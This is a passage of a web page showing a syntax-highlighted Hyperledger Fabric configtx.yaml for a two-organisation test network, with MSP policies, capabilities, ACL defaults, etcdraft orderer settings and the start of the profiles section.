might</span><br>                <span class="hljs-comment"># want to use a more specific rule like the following:</span><br>                <span class="hljs-comment"># Rule: &quot;OR(&#x27;SampleOrg.admin&#x27;, &#x27;SampleOrg.client&#x27;)&quot;</span><br>            <span class="hljs-attr">Admins:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;OrdererMSP.admin&#x27;)&quot;</span><br>            <span class="hljs-attr">Endorsement:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;OrdererMSP.member&#x27;)&quot;</span><br><br>        <span class="hljs-comment"># OrdererEndpoints is a list of all orderers this org runs which clients</span><br>        <span class="hljs-comment"># and peers may to connect to to push transactions and receive blocks respectively.</span><br>        <span class="hljs-attr">OrdererEndpoints:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;orderer0.example.com:7050&quot;</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;orderer1.example.com:8050&quot;</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;orderer2.example.com:9050&quot;</span><br><br>        <span class="hljs-comment"># AnchorPeers defines the location of peers which can be used for</span><br>        <span class="hljs-comment"># cross-org gossip communication.</span><br>        <span class="hljs-comment">#</span><br>        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> this value should only be set when using the deprecated</span><br>        <span class="hljs-comment"># `configtxgen --outputAnchorPeersUpdate` command. It is recommended</span><br>        <span class="hljs-comment"># to instead use the channel configuration update process to set the</span><br>        <span class="hljs-comment"># anchor peers for each organization.</span><br>        <span class="hljs-comment"># AnchorPeers:</span><br>        <span class="hljs-comment">#     - Host: 127.0.0.1</span><br>        <span class="hljs-comment">#       Port: 7051</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-meta">&amp;Org1</span><br><br>        <span class="hljs-attr">Name:</span> <span class="hljs-string">Org1MSP</span><br>        <span class="hljs-attr">ID:</span> <span class="hljs-string">Org1MSP</span><br>        <span class="hljs-attr">MSPDir:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/peerOrganizations/org1.example.com/msp</span><br>        <span class="hljs-attr">Policies:</span><br>            <span class="hljs-attr">Readers:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org1MSP.admin&#x27;, &#x27;Org1MSP.peer&#x27;, &#x27;Org1MSP.client&#x27;)&quot;</span><br>            <span class="hljs-attr">Writers:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org1MSP.admin&#x27;, &#x27;Org1MSP.client&#x27;)&quot;</span><br>            <span class="hljs-attr">Admins:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org1MSP.admin&#x27;)&quot;</span><br>            <span class="hljs-attr">Endorsement:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org1MSP.peer&#x27;)&quot;</span><br>        <span class="hljs-attr">AnchorPeers:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">Host:</span> <span class="hljs-string">peer0.org1.example.com</span><br>              <span class="hljs-attr">Port:</span> <span class="hljs-number">7051</span><br><br><br>    <span class="hljs-bullet">-</span> <span class="hljs-meta">&amp;Org2</span><br><br>        <span class="hljs-attr">Name:</span> <span class="hljs-string">Org2MSP</span><br>        <span class="hljs-attr">ID:</span> <span class="hljs-string">Org2MSP</span><br>        <span class="hljs-attr">MSPDir:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/peerOrganizations/org2.example.com/msp</span><br>        <span class="hljs-attr">Policies:</span><br>            <span class="hljs-attr">Readers:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org2MSP.admin&#x27;, &#x27;Org2MSP.peer&#x27;, &#x27;Org2MSP.client&#x27;)&quot;</span><br>            <span class="hljs-attr">Writers:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org2MSP.admin&#x27;, &#x27;Org2MSP.client&#x27;)&quot;</span><br>            <span class="hljs-attr">Admins:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org2MSP.admin&#x27;)&quot;</span><br>            <span class="hljs-attr">Endorsement:</span><br>                <span class="hljs-attr">Type:</span> <span class="hljs-string">Signature</span><br>                <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;OR(&#x27;Org2MSP.peer&#x27;)&quot;</span><br>        <span class="hljs-attr">AnchorPeers:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">Host:</span> <span class="hljs-string">peer0.org2.example.com</span><br>              <span class="hljs-attr">Port:</span> <span class="hljs-number">9051</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   CAPABILITIES</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   This section defines the capabilities of fabric network. This is a new</span><br><span class="hljs-comment">#   concept as of v1.1.0 and should not be utilized in mixed networks with</span><br><span class="hljs-comment">#   v1.0.x peers and orderers.  Capabilities define features which must be</span><br><span class="hljs-comment">#   present in a fabric binary for that binary to safely participate in the</span><br><span class="hljs-comment">#   fabric network.  For instance, if a new MSP type is added, newer binaries</span><br><span class="hljs-comment">#   might recognize and validate the signatures from this type, while older</span><br><span class="hljs-comment">#   binaries without this support would be unable to validate those</span><br><span class="hljs-comment">#   transactions.  This could lead to different versions of the fabric binaries</span><br><span class="hljs-comment">#   having different world states.  Instead, defining a capability for a channel</span><br><span class="hljs-comment">#   informs those binaries without this capability that they must cease</span><br><span class="hljs-comment">#   processing transactions until they have been upgraded.  For v1.0.x if any</span><br><span class="hljs-comment">#   capabilities are defined (including a map with all capabilities turned off)</span><br><span class="hljs-comment">#   then the v1.0.x peer will deliberately crash.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-attr">Capabilities:</span><br>    <span class="hljs-comment"># Channel capabilities apply to both the orderers and the peers and must be</span><br>    <span class="hljs-comment"># supported by both.</span><br>    <span class="hljs-comment"># Set the value of the capability to true to require it.</span><br>    <span class="hljs-attr">Channel:</span> <span class="hljs-meta">&amp;ChannelCapabilities</span><br>        <span class="hljs-comment"># V2.0 for Channel is a catchall flag for behavior which has been</span><br>        <span class="hljs-comment"># determined to be desired for all orderers and peers running at the v2.0.0</span><br>        <span class="hljs-comment"># level, but which would be incompatible with orderers and peers from</span><br>        <span class="hljs-comment"># prior releases.</span><br>        <span class="hljs-comment"># Prior to enabling V2.0 channel capabilities, ensure that all</span><br>        <span class="hljs-comment"># orderers and peers on a channel are at v2.0.0 or later.</span><br>        <span class="hljs-attr">V2_0:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># Orderer capabilities apply only to the orderers, and may be safely</span><br>    <span class="hljs-comment"># used with prior release peers.</span><br>    <span class="hljs-comment"># Set the value of the capability to true to require it.</span><br>    <span class="hljs-attr">Orderer:</span> <span class="hljs-meta">&amp;OrdererCapabilities</span><br>        <span class="hljs-comment"># V1.1 for Orderer is a catchall flag for behavior which has been</span><br>        <span class="hljs-comment"># determined to be desired for all orderers running at the v1.1.x</span><br>        <span class="hljs-comment"># level, but which would be incompatible with orderers from prior releases.</span><br>        <span class="hljs-comment"># Prior to enabling V2.0 orderer capabilities, ensure that all</span><br>        <span class="hljs-comment"># orderers on a channel are at v2.0.0 or later.</span><br>        <span class="hljs-attr">V2_0:</span> <span class="hljs-literal">true</span><br><br>    <span class="hljs-comment"># Application capabilities apply only to the peer network, and may be safely</span><br>    <span class="hljs-comment"># used with prior release orderers.</span><br>    <span class="hljs-comment"># Set the value of the capability to true to require it.</span><br>    <span class="hljs-attr">Application:</span> <span class="hljs-meta">&amp;ApplicationCapabilities</span><br>        <span class="hljs-comment"># V2.0 for Application enables the new non-backwards compatible</span><br>        <span class="hljs-comment"># features and fixes of fabric v2.0.</span><br>        <span class="hljs-comment"># Prior to enabling V2.0 orderer capabilities, ensure that all</span><br>        <span class="hljs-comment"># orderers on a channel are at v2.0.0 or later.</span><br>        <span class="hljs-attr">V2_0:</span> <span class="hljs-literal">true</span><br><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   APPLICATION</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   This section defines the values to encode into a config transaction or</span><br><span class="hljs-comment">#   genesis block for application-related parameters.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-attr">Application:</span> <span class="hljs-meta">&amp;ApplicationDefaults</span><br>    <span class="hljs-attr">ACLs:</span> <span class="hljs-meta">&amp;ACLsDefault</span><br>        <span class="hljs-comment"># This section provides defaults for policies for various resources</span><br>        <span class="hljs-comment"># in the system. These &quot;resources&quot; could be functions on system chaincodes</span><br>        <span class="hljs-comment"># (e.g., &quot;GetBlockByNumber&quot; on the &quot;qscc&quot; system chaincode) or other resources</span><br>        <span class="hljs-comment"># (e.g.,who can receive Block events). This section does NOT specify the resource&#x27;s</span><br>        <span class="hljs-comment"># definition or API, but just the ACL policy for it.</span><br>        <span class="hljs-comment">#</span><br>        <span class="hljs-comment"># Users can override these defaults with their own policy mapping by defining the</span><br>        <span class="hljs-comment"># mapping under ACLs in their channel definition</span><br><br>        <span class="hljs-comment">#---New Lifecycle System Chaincode (_lifecycle) function to policy mapping for access control--#</span><br><br>        <span class="hljs-comment"># ACL policy for _lifecycle&#x27;s &quot;CheckCommitReadiness&quot; function</span><br>        <span class="hljs-attr">_lifecycle/CheckCommitReadiness:</span> <span class="hljs-string">/Channel/Application/Writers</span><br><br>        <span class="hljs-comment"># ACL policy for _lifecycle&#x27;s &quot;CommitChaincodeDefinition&quot; function</span><br>        <span class="hljs-attr">_lifecycle/CommitChaincodeDefinition:</span> <span class="hljs-string">/Channel/Application/Writers</span><br><br>        <span class="hljs-comment"># ACL policy for _lifecycle&#x27;s &quot;QueryChaincodeDefinition&quot; function</span><br>        <span class="hljs-attr">_lifecycle/QueryChaincodeDefinition:</span> <span class="hljs-string">/Channel/Application/Writers</span><br><br>        <span class="hljs-comment"># ACL policy for _lifecycle&#x27;s &quot;QueryChaincodeDefinitions&quot; function</span><br>        <span class="hljs-attr">_lifecycle/QueryChaincodeDefinitions:</span> <span class="hljs-string">/Channel/Application/Writers</span><br><br>        <span class="hljs-comment">#---Lifecycle System Chaincode (lscc) function to policy mapping for access control---#</span><br><br>        <span class="hljs-comment"># ACL policy for lscc&#x27;s &quot;getid&quot; function</span><br>        <span class="hljs-attr">lscc/ChaincodeExists:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for lscc&#x27;s &quot;getdepspec&quot; function</span><br>        <span class="hljs-attr">lscc/GetDeploymentSpec:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for lscc&#x27;s &quot;getccdata&quot; function</span><br>        <span class="hljs-attr">lscc/GetChaincodeData:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL Policy for lscc&#x27;s &quot;getchaincodes&quot; function</span><br>        <span class="hljs-attr">lscc/GetInstantiatedChaincodes:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment">#---Query System Chaincode (qscc) function to policy mapping for access control---#</span><br><br>        <span class="hljs-comment"># ACL policy for qscc&#x27;s &quot;GetChainInfo&quot; function</span><br>        <span class="hljs-attr">qscc/GetChainInfo:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for qscc&#x27;s &quot;GetBlockByNumber&quot; function</span><br>        <span class="hljs-attr">qscc/GetBlockByNumber:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for qscc&#x27;s  &quot;GetBlockByHash&quot; function</span><br>        <span class="hljs-attr">qscc/GetBlockByHash:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for qscc&#x27;s &quot;GetTransactionByID&quot; function</span><br>        <span class="hljs-attr">qscc/GetTransactionByID:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for qscc&#x27;s &quot;GetBlockByTxID&quot; function</span><br>        <span class="hljs-attr">qscc/GetBlockByTxID:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment">#---Configuration System Chaincode (cscc) function to policy mapping for access control---#</span><br><br>        <span class="hljs-comment"># ACL policy for cscc&#x27;s &quot;GetConfigBlock&quot; function</span><br>        <span class="hljs-attr">cscc/GetConfigBlock:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for cscc&#x27;s &quot;GetChannelConfig&quot; function</span><br>        <span class="hljs-attr">cscc/GetChannelConfig:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment">#---Miscellaneous peer function to policy mapping for access control---#</span><br><br>        <span class="hljs-comment"># ACL policy for invoking chaincodes on peer</span><br>        <span class="hljs-attr">peer/Propose:</span> <span class="hljs-string">/Channel/Application/Writers</span><br><br>        <span class="hljs-comment"># ACL policy for chaincode to chaincode invocation</span><br>        <span class="hljs-attr">peer/ChaincodeToChaincode:</span> <span class="hljs-string">/Channel/Application/Writers</span><br><br>        <span class="hljs-comment">#---Events resource to policy mapping for access control###---#</span><br><br>        <span class="hljs-comment"># ACL policy for sending block events</span><br>        <span class="hljs-attr">event/Block:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>        <span class="hljs-comment"># ACL policy for sending filtered block events</span><br>        <span class="hljs-attr">event/FilteredBlock:</span> <span class="hljs-string">/Channel/Application/Readers</span><br><br>    <span class="hljs-comment"># Organizations lists the orgs participating on the application side of the</span><br>    <span class="hljs-comment"># network.</span><br>    <span class="hljs-attr">Organizations:</span><br><br>    <span class="hljs-comment"># Policies defines the set of policies at this level of the config tree</span><br>    <span class="hljs-comment"># For Application policies, their canonical path is</span><br>    <span class="hljs-comment">#   /Channel/Application/&lt;PolicyName&gt;</span><br>    <span class="hljs-attr">Policies:</span> <span class="hljs-meta">&amp;ApplicationDefaultPolicies</span><br>        <span class="hljs-attr">LifecycleEndorsement:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;MAJORITY Endorsement&quot;</span><br>        <span class="hljs-attr">Endorsement:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;MAJORITY Endorsement&quot;</span><br>        <span class="hljs-attr">Readers:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;ANY Readers&quot;</span><br>        <span class="hljs-attr">Writers:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;ANY Writers&quot;</span><br>        <span class="hljs-attr">Admins:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;MAJORITY Admins&quot;</span><br><br>    <span class="hljs-comment"># Capabilities describes the application level capabilities, see the</span><br>    <span class="hljs-comment"># dedicated Capabilities section elsewhere in this file for a full</span><br>    <span class="hljs-comment"># description</span><br>    <span class="hljs-attr">Capabilities:</span><br>        <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*ApplicationCapabilities</span><br><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   ORDERER</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   This section defines the values to encode into a config transaction or</span><br><span class="hljs-comment">#   genesis block for orderer related parameters.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-attr">Orderer:</span> <span class="hljs-meta">&amp;OrdererDefaults</span><br><br>    <span class="hljs-comment"># Orderer Type: The orderer implementation to start.</span><br>    <span class="hljs-comment"># Available types are &quot;solo&quot;, &quot;kafka&quot; and &quot;etcdraft&quot;.</span><br>    <span class="hljs-attr">OrdererType:</span> <span class="hljs-string">etcdraft</span><br><br>    <span class="hljs-comment"># Addresses used to be the list of orderer addresses that clients and peers</span><br>    <span class="hljs-comment"># could connect to.  However, this does not allow clients to associate orderer</span><br>    <span class="hljs-comment"># addresses and orderer organizations which can be useful for things such</span><br>    <span class="hljs-comment"># as TLS validation.  The preferred way to specify orderer addresses is now</span><br>    <span class="hljs-comment"># to include the OrdererEndpoints item in your org definition</span><br>    <span class="hljs-attr">Addresses:</span><br>        <span class="hljs-comment"># - 127.0.0.1:7050</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;orderer0.example.com:7050&quot;</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;orderer1.example.com:8050&quot;</span><br>        <span class="hljs-bullet">-</span> <span class="hljs-string">&quot;orderer2.example.com:9050&quot;</span><br><br>    <span class="hljs-comment"># Batch Timeout: The amount of time to wait before creating a batch.</span><br>    <span class="hljs-attr">BatchTimeout:</span> <span class="hljs-string">2s</span><br><br>    <span class="hljs-comment"># Batch Size: Controls the number of messages batched into a block.</span><br>    <span class="hljs-comment"># The orderer views messages opaquely, but typically, messages may</span><br>    <span class="hljs-comment"># be considered to be Fabric transactions.  The &#x27;batch&#x27; is the group</span><br>    <span class="hljs-comment"># of messages in the &#x27;data&#x27; field of the block.  Blocks will be a few kb</span><br>    <span class="hljs-comment"># larger than the batch size, when signatures, hashes, and other metadata</span><br>    <span class="hljs-comment"># is applied.</span><br>    <span class="hljs-attr">BatchSize:</span><br><br>        <span class="hljs-comment"># Max Message Count: The maximum number of messages to permit in a</span><br>        <span class="hljs-comment"># batch.  No block will contain more than this number of messages.</span><br>        <span class="hljs-attr">MaxMessageCount:</span> <span class="hljs-number">500</span><br><br>        <span class="hljs-comment"># Absolute Max Bytes: The absolute maximum number of bytes allowed for</span><br>        <span class="hljs-comment"># the serialized messages in a batch. The maximum block size is this value</span><br>        <span class="hljs-comment"># plus the size of the associated metadata (usually a few KB depending</span><br>        <span class="hljs-comment"># upon the size of the signing identities). Any transaction larger than</span><br>        <span class="hljs-comment"># this value will be rejected by ordering.</span><br>        <span class="hljs-comment"># It is recommended not to exceed 49 MB, given the default grpc max message size of 100 MB</span><br>        <span class="hljs-comment"># configured on orderer and peer nodes (and allowing for message expansion during communication).</span><br>        <span class="hljs-attr">AbsoluteMaxBytes:</span> <span class="hljs-number">10</span> <span class="hljs-string">MB</span><br><br>        <span class="hljs-comment"># Preferred Max Bytes: The preferred maximum number of bytes allowed</span><br>        <span class="hljs-comment"># for the serialized messages in a batch. Roughly, this field may be considered</span><br>        <span class="hljs-comment"># the best effort maximum size of a batch. A batch will fill with messages</span><br>        <span class="hljs-comment"># until this size is reached (or the max message count, or batch timeout is</span><br>        <span class="hljs-comment"># exceeded).  If adding a new message to the batch would cause the batch to</span><br>        <span class="hljs-comment"># exceed the preferred max bytes, then the current batch is closed and written</span><br>        <span class="hljs-comment"># to a block, and a new batch containing the new message is created.  If a</span><br>        <span class="hljs-comment"># message larger than the preferred max bytes is received, then its batch</span><br>        <span class="hljs-comment"># will contain only that message.  Because messages may be larger than</span><br>        <span class="hljs-comment"># preferred max bytes (up to AbsoluteMaxBytes), some batches may exceed</span><br>        <span class="hljs-comment"># the preferred max bytes, but will always contain exactly one transaction.</span><br>        <span class="hljs-attr">PreferredMaxBytes:</span> <span class="hljs-number">2</span> <span class="hljs-string">MB</span><br><br>    <span class="hljs-comment"># Max Channels is the maximum number of channels to allow on the ordering</span><br>    <span class="hljs-comment"># network. When set to 0, this implies no maximum number of channels.</span><br>    <span class="hljs-attr">MaxChannels:</span> <span class="hljs-number">0</span><br><br>    <span class="hljs-attr">Kafka:</span><br>        <span class="hljs-comment"># Brokers: A list of Kafka brokers to which the orderer connects. Edit</span><br>        <span class="hljs-comment"># this list to identify the brokers of the ordering service.</span><br>        <span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> Use IP:port notation.</span><br>        <span class="hljs-attr">Brokers:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">kafka0:9092</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">kafka1:9092</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">kafka2:9092</span><br><br>    <span class="hljs-comment"># EtcdRaft defines configuration which must be set when the &quot;etcdraft&quot;</span><br>    <span class="hljs-comment"># orderertype is chosen.</span><br>    <span class="hljs-attr">EtcdRaft:</span><br>        <span class="hljs-comment"># The set of Raft replicas for this network. For the etcd/raft-based</span><br>        <span class="hljs-comment"># implementation, we expect every replica to also be an OSN. Therefore,</span><br>        <span class="hljs-comment"># a subset of the host:port items enumerated in this list should be</span><br>        <span class="hljs-comment"># replicated under the Orderer.Addresses key above.</span><br>        <span class="hljs-attr">Consenters:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">Host:</span> <span class="hljs-string">orderer0.example.com</span><br>              <span class="hljs-attr">Port:</span> <span class="hljs-number">7050</span><br>              <span class="hljs-attr">ClientTLSCert:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.crt</span><br>              <span class="hljs-attr">ServerTLSCert:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/ordererOrganizations/example.com/orderers/orderer0.example.com/tls/server.crt</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">Host:</span> <span class="hljs-string">orderer1.example.com</span><br>              <span class="hljs-attr">Port:</span> <span class="hljs-number">8050</span><br>              <span class="hljs-attr">ClientTLSCert:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.crt</span><br>              <span class="hljs-attr">ServerTLSCert:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/ordererOrganizations/example.com/orderers/orderer1.example.com/tls/server.crt</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-attr">Host:</span> <span class="hljs-string">orderer2.example.com</span><br>              <span class="hljs-attr">Port:</span> <span class="hljs-number">9050</span><br>              <span class="hljs-attr">ClientTLSCert:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt</span><br>              <span class="hljs-attr">ServerTLSCert:</span> <span class="hljs-string">/home/moindy/project/test-network/crypto-config/ordererOrganizations/example.com/orderers/orderer2.example.com/tls/server.crt</span><br><br>        <span class="hljs-comment"># Options to be specified for all the etcd/raft nodes. The values here</span><br>        <span class="hljs-comment"># are the defaults for all new channels and can be modified on a</span><br>        <span class="hljs-comment"># per-channel basis via configuration updates.</span><br>        <span class="hljs-attr">Options:</span><br>            <span class="hljs-comment"># TickInterval is the time interval between two Node.Tick invocations.</span><br>            <span class="hljs-attr">TickInterval:</span> <span class="hljs-string">500ms</span><br><br>            <span class="hljs-comment"># ElectionTick is the number of Node.Tick invocations that must pass</span><br>            <span class="hljs-comment"># between elections. That is, if a follower does not receive any</span><br>            <span class="hljs-comment"># message from the leader of current term before ElectionTick has</span><br>            <span class="hljs-comment"># elapsed, it will become candidate and start an election.</span><br>            <span class="hljs-comment"># ElectionTick must be greater than HeartbeatTick.</span><br>            <span class="hljs-attr">ElectionTick:</span> <span class="hljs-number">10</span><br><br>            <span class="hljs-comment"># HeartbeatTick is the number of Node.Tick invocations that must</span><br>            <span class="hljs-comment"># pass between heartbeats. That is, a leader sends heartbeat</span><br>            <span class="hljs-comment"># messages to maintain its leadership every HeartbeatTick ticks.</span><br>            <span class="hljs-attr">HeartbeatTick:</span> <span class="hljs-number">1</span><br><br>            <span class="hljs-comment"># MaxInflightBlocks limits the max number of in-flight append messages</span><br>            <span class="hljs-comment"># during optimistic replication phase.</span><br>            <span class="hljs-attr">MaxInflightBlocks:</span> <span class="hljs-number">5</span><br><br>            <span class="hljs-comment"># SnapshotIntervalSize defines number of bytes per which a snapshot is taken</span><br>            <span class="hljs-attr">SnapshotIntervalSize:</span> <span class="hljs-number">16</span> <span class="hljs-string">MB</span><br><br>    <span class="hljs-comment"># Organizations lists the orgs participating on the orderer side of the</span><br>    <span class="hljs-comment"># network.</span><br>    <span class="hljs-attr">Organizations:</span><br><br>    <span class="hljs-comment"># Policies defines the set of policies at this level of the config tree</span><br>    <span class="hljs-comment"># For Orderer policies, their canonical path is</span><br>    <span class="hljs-comment">#   /Channel/Orderer/&lt;PolicyName&gt;</span><br>    <span class="hljs-attr">Policies:</span><br>        <span class="hljs-attr">Readers:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;ANY Readers&quot;</span><br>        <span class="hljs-attr">Writers:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;ANY Writers&quot;</span><br>        <span class="hljs-attr">Admins:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;MAJORITY Admins&quot;</span><br>        <span class="hljs-comment"># BlockValidation specifies what signatures must be included in the block</span><br>        <span class="hljs-comment"># from the orderer for the peer to validate it.</span><br>        <span class="hljs-attr">BlockValidation:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;ANY Writers&quot;</span><br><br>    <span class="hljs-comment"># Capabilities describes the orderer level capabilities, see the</span><br>    <span class="hljs-comment"># dedicated Capabilities section elsewhere in this file for a full</span><br>    <span class="hljs-comment"># description</span><br>    <span class="hljs-attr">Capabilities:</span><br>        <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*OrdererCapabilities</span><br><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   CHANNEL</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   This section defines the values to encode into a config transaction or</span><br><span class="hljs-comment">#   genesis block for channel related parameters.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-attr">Channel:</span> <span class="hljs-meta">&amp;ChannelDefaults</span><br>    <span class="hljs-comment"># Policies defines the set of policies at this level of the config tree</span><br>    <span class="hljs-comment"># For Channel policies, their canonical path is</span><br>    <span class="hljs-comment">#   /Channel/&lt;PolicyName&gt;</span><br>    <span class="hljs-attr">Policies:</span><br>        <span class="hljs-comment"># Who may invoke the &#x27;Deliver&#x27; API</span><br>        <span class="hljs-attr">Readers:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;ANY Readers&quot;</span><br>        <span class="hljs-comment"># Who may invoke the &#x27;Broadcast&#x27; API</span><br>        <span class="hljs-attr">Writers:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;ANY Writers&quot;</span><br>        <span class="hljs-comment"># By default, who may modify elements at this config level</span><br>        <span class="hljs-attr">Admins:</span><br>            <span class="hljs-attr">Type:</span> <span class="hljs-string">ImplicitMeta</span><br>            <span class="hljs-attr">Rule:</span> <span class="hljs-string">&quot;MAJORITY Admins&quot;</span><br><br><br>    <span class="hljs-comment"># Capabilities describes the channel level capabilities, see the</span><br>    <span class="hljs-comment"># dedicated Capabilities section elsewhere in this file for a full</span><br>    <span class="hljs-comment"># description</span><br>    <span class="hljs-attr">Capabilities:</span><br>        <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*ChannelCapabilities</span><br><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   PROFILES</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#   Different configuration profiles may be encoded here to be specified as</span><br><span class="hljs-comment">#   parameters to the configtxgen tool. The profiles which specify consortiums</span><br><span class="hljs-comment">#   are to be used for generating the orderer genesis block. With the correct</span><br><span class="hljs-comment">#   consortium members defined in the orderer genesis block, channel creation</span><br><span class="hljs-comment">#   requests may be generated with only the org member names and a consortium</span><br><span class="hljs-comment">#   name.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">################################################################################</span><br><span class="hljs-attr">Profiles:</span><br><br>    <span class="hljs-attr">TwoOrgsOrdererGenesis:</span><br>        <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*ChannelDefaults</span><br>        <span class="hljs-attr">Orderer:</span><br>            <span class="hljs-string">&lt;&lt;:</span> <span class="hljs-meta">*OrdererDefaults</span><br>            <span 